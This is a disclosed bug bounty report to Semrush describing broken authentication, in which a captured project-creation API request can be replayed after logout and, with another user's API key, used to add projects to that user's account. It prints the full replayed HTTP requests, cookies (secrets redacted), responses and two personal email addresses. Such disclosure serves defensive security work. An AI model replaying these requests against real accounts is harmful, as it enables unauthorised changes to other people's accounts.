# Broken Authentication: A project addition request can be used multiple time for different users

## Report Details
- **Report ID**: 319480
- **URL**: https://hackerone.com/reports/319480
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-02-25T07:37:55.196Z
- **Disclosed**: 2018-03-13T14:30:20.478Z

## Reporter
- **Username**: walterhwhite
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: semrush

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!

**Summary:** 
[**Broken Authentication**. A project addition request can be used multiple time for different users]

**Description:** 
[**Reusable requests**. Once a project addition request is captured it can be used any number of times even after logout not only for the corresponding user but for any user with API key.

## Steps To Reproduce:


  1. Create two users for semrush.com 

		i) cleganearya1@gmail.com
		ii)saidutt.mekala@gmail.com
  2. Now create a project for the user saidutt.mekala@gmail.com
  3. Following will be the request along with headers for project creation:

POST /projects/api/projects/?key=█████████ HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.semrush.com/projects/?1519503450
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 86
Cookie: __cfduid=d586fa9b6fb028d425a8df52599e73d021519503413; PHPSESSID=██████████; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%7D; db=us; n_userid=LuWkzFqRyDaG+2bqBEeyAg==; semrush_counter_cookie=deleted; visit_first=1519503421910; userdata=%7B%22tz%22%3A%22GMT+5.5%22%2C%22ol%22%3A%22en%22%7D; utz=Asia%2FKolkata; wp13557=UWYYADDDDDDIKXCIMMK-JBZZ-XLLX-BYCY-ILTWWCUBMTICDMUMLJIZI-AZAL-XLML-CJHX-WTBKZBVKZXWVDlLtkNlo_Jht; uvts=7B3Au3azsgVbSB6R; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en
DNT: 1
Connection: keep-alive

{"domain":"BB1236.com","name":"BB12367.com","url":"BB123678.com","acl":{"write":true}}

4. Now delete the added project.
5. Logout of the application and close the browser.
6. Resend the above request with different parameters like {"domain":"Walterwhite12.com","name":"Walterwhite12.com","url":"Walterwhite12.com","acl":{"write":true}}

Following is the response:  

HTTP/1.1 200 
Date: Sun, 25 Feb 2018 06:50:58 GMT
Content-Type: application/json;charset=UTF-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 3f28bbc28bbd17aa-SIN
Content-Length: 224

{"id":1266025,"domain":"walterwhite12.com","name":"Walterwhite12.com","email":"saidutt.mekala@gmail.com","tools":[],"permission":["OWNER"],"available":true,"favorite":false,"root_domain":"walterwhite12.com","times_shared":0}

7. Now we can also add the project to any user by using his API Key in the request. In the following request I have used the API Key of the user cleganearya1@gmail.com :

POST /projects/api/projects/?key=█████████ HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://www.semrush.com/projects/?1519503450
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 104
Cookie: __cfduid=d586fa9b6fb028d425a8df52599e73d021519503413; PHPSESSID=██████; ref_code=__default__; usertype=Free-User; marketing=%7B%22user_cmp%22%3A%22%22%2C%22user_label%22%3A%22%22%7D; localization=%7B%22locale%22%3A%22en%22%7D; db=us; n_userid=LuWkzFqRyDaG+2bqBEeyAg==; semrush_counter_cookie=deleted; visit_first=1519503421910; userdata=%7B%22tz%22%3A%22GMT+5.5%22%2C%22ol%22%3A%22en%22%7D; utz=Asia%2FKolkata; wp13557=UWYYADDDDDDIKXCIMMK-JBZZ-XLLX-BYCY-ILTWWCUBMTICDMUMLJIZI-AZAL-XLML-CJHX-WTBKZBVKZXWVDlLtkNlo_Jht; uvts=7B3Au3azsgVbSB6R; org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE=en
DNT: 1
Connection: keep-alive

{"domain":"Walterwhite12.com","name":"Walterwhite12.com","url":"Walterwhite12.com","acl":{"write":true}}

8. Following is the response for the above request:

HTTP/1.1 200 
Date: Sun, 25 Feb 2018 06:53:17 GMT
Content-Type: application/json;charset=UTF-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
Expect-CT: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
CF-RAY: 3f28bf1e9f8917aa-SIN
Content-Length: 222

{"id":1266027,"domain":"walterwhite12.com","name":"Walterwhite12.com","email":"cleganearya1@gmail.com","tools":[],"permission":["OWNER"],"available":true,"favorite":false,"root_domain":"walterwhite12.com","times_shared":0}

## Impact

Once a project addition request is captured it can be used any number of times even after logout not only for the corresponding user but for any user with API key. Hence there is no need to login for the user to create a project because an attacker can directly add a project to victims account with his own malicious inputs/scrips and make them executable without victims awareness.

i) Reusable cookies for same user.
ii)There is no match verification between the API Key and cookie/sessionIds. There should be a server side validation which should validate the relation between an API Key provided and the sessionIds of the current user.

## Attachments
No attachments
